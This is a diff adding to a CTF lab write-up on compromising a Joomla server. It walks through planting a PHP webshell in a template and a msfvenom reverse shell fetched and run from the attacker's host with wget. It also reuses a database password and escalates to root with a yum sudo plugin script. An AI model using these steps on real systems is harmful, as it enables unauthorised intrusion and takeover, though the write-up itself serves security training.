@@ -83,7 +83,7 @@ At `/administrator` there is a Joomla admin panel login:
 
 ![](img/joomla-login.png)
 
-And at the next level (`/administrator/manfiests`), there is an index-of page to browse the directory tree:
+And at the next level (`/administrator/manfiests`, found with gobuster), there is an index-of page to browse the directory tree:
 
 ![](img/indexof-admin-manifest.png)
 
@@ -152,3 +152,170 @@ $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
 
 So jonah's password is `spiderman123`!
 
+That logs us into the admin panel at `/administrator`:
+
+![](img/web-joomla-admin-main.png)
+
+First thought is to drop a pre-made webshell. Googling for 'joomla webshell' turns up an interesting page:
+
+- [https://seclists.org/oss-sec/2015/q2/759](https://seclists.org/oss-sec/2015/q2/759)
+
+Key parts:
+
+```
+In the "media manager" options, you can add to the list of allowed
+file extensions...
+As it turns out, mod-php, by default on Ubuntu, will execute any files
+with an extension that matches this regex : "^.ph(p[345]?|t|tml|ps)$"
+If you rename your webshell shell.php3, and add "php3" to the allowed
+file extensions, and it will upload just fine.
+```
+
+Going to give that a shot. Clicked on "System" dropdown, then "Global Configuration", then "Media", then add "phtml" to list of extensions:
+
+![](img/web-joomla-media-ext.png)
+
+Then click "Save & Close" button at the top, and it brings you to a new page where you can upload media files:
+
+![](img/web-joomla-media-upload.png)
+
+First, make a malicious file named derp.phtml:
+
+```sh
+❯ echo '<?php system($_GET["cmd"]); ?>' > derp.phtml
+```
+
+Then click "Upload" and select your new file, then click "Start Upload":
+
+![](img/web-joomla-media-upload-filled.png)
+
+But it doesn't show up in the list of files? Trying to browse to the url `/images/derp.phtml` also fails:
+
+![](img/web-media-exploit-fail.png)
+
+Went back to settings and tried changing more settings to stop checking MIME types and not restrict downloads, and add "phtml" to the list of image files:
+
+![](img/web-joomla-media-settings.png)
+
+But still, no luck. Maybe if I make the file look like a gif?
+
+```sh
+❯ echo 'GIF8;<?php system($_GET["cmd"]); ?>' > derp.gif
+```
+
+But that won't upload either. :disappointed:
+
+Maybe the original idea of a webshell will still work if I upload it as a Joomla extension. I found the WSO Shell, which looks promising:
+
+- [https://extensions.joomla.org/extension/wso-command-shell-and-file-manager/](https://extensions.joomla.org/extension/wso-command-shell-and-file-manager/)
+
+But unfortunately you have to pay for it? And developing my own Joomla plugin seems overkill right now:
+
+- [https://docs.joomla.org/J3.x:Creating_a_Plugin_for_Joomla](https://docs.joomla.org/J3.x:Creating_a_Plugin_for_Joomla)
+
+But this article gave me the idea that I don't have to upload a Joomla plugin, but instead I can modify the php of the template files!
+
+- [https://www.hackingarticles.in/joomla-reverse-shell/](https://www.hackingarticles.in/joomla-reverse-shell/)
+
+And another POC showed me where to browse to trigger the template code:
+
+- [https://packetstormsecurity.com/files/142731/Joomla-3.x-Proof-Of-Concept-Shell-Upload.html](https://packetstormsecurity.com/files/142731/Joomla-3.x-Proof-Of-Concept-Shell-Upload.html)
+
+Which would be under the "/templates" directory.
+
+So click the "Extensions" dropdown, then "Templates" > "Templates". This brings you to a page with templates that you can edit.
+
+![](img/web-joomla-templates.png)
+
+Click on the "Beez3 Details and Files" one (either one should work?), then click "New File". This brings up a dialog to create a new file:
+
+![](img/web-joomla-new-file.png)
+
+I named it "derp" and set the type to "php". Note: you can't include the extension in the file name because it gets added automatically (and it will restrict you to alphanumeric characters plus hyphen and underscore).
+
+Next step is to add code to your new file that gives you a webshell:
+
+![](img/web-joomla-making-webshell.png)
+
+Then browse to the new webshell at `/templates/beez3/derp.php?cmd=id` and we see it executed the `id` command!
+
+![](img/webshell.png)
+
+Run a quick `uname -a` in the webshell to get the kernel info:
+
+```
+Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+And `which wget` to check if we can download files
+
+```
+http://10.10.124.218/templates/beez3/derp.php?cmd=which%20wget
+
+/usr/bin/wget
+```
+
+Now prep a reverse shell, upload, and execute!
+
+```sh
+# generate reverse shell
+❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.6.38.182 LPORT=443 -f elf -o rsh.elf
+# start listener
+❯ sudo nc -lvnp 443
+# serve file over http
+❯ sudo python3 -m http.server 80
+# make the victim download and execute the reverse shell
+❯ curl -G http://10.10.124.218/templates/beez3/derp.php --data-urlencode "cmd=wget -cP /tmp 10.6.38.182/rsh.elf && chmod +x /tmp/rsh.elf && /tmp/rsh.elf"
+```
+
+## privesc
+
+Download and execute linpeas.
+
+Find password for MySQL DB in php config file (`/var/www/html/configuration.php:`) from linpeas: `root:nv5uz9r3ZEDzVjNu`
+
+This password works for user `jjameson` (either for `ssh` or `su`)!
+
+```sh
+$ su - jjameson
+Password: nv5uz9r3ZEDzVjNu
+$ id
+uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
+```
+
+Running `sudo -l` we see:
+
+```
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+```
+
+Yum is a [GTFObin](https://gtfobins.github.io/gtfobins/yum/#sudo), with the following exploit for a root shell:
+
+```sh
+TF=$(mktemp -d)
+cat >$TF/x<<EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat >$TF/y.conf<<EOF
+[main]
+enabled=1
+EOF
+
+cat >$TF/y.py<<EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+EOF
+
+sudo yum -c $TF/x --enableplugin=y
+```
+
+Running those commands gives us root!
